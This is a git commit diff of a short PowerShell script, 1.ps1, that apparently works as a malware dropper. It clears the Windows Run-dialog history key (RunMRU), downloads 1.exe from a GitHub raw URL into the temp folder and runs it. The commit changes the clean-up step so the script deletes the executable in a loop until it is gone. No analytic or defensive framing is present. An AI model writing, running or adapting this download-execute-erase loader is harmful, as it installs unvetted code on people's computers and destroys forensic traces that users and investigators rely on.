30b99526f3817f57146d66af43a1f76c9f96d521
samanaya <samanayapakisyan@gmail.com>
2024-12-04 18:47:37 +0200

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,5 +1,4 @@
 Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force -ErrorAction SilentlyContinue
 (new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/samanaya/1/main/1.exe", "$env:TEMP\\1.exe")
 Start-Process "$env:TEMP\\1.exe" -Wait
-Start-Sleep -Milliseconds 5000
-Remove-Item "$env:TEMP\\1.exe" -Force -ErrorAction SilentlyContinue
+while (Test-Path "$env:TEMP\\1.exe") { Start-Sleep -Milliseconds 100; Remove-Item "$env:TEMP\\1.exe" -Force -ErrorAction SilentlyContinue }
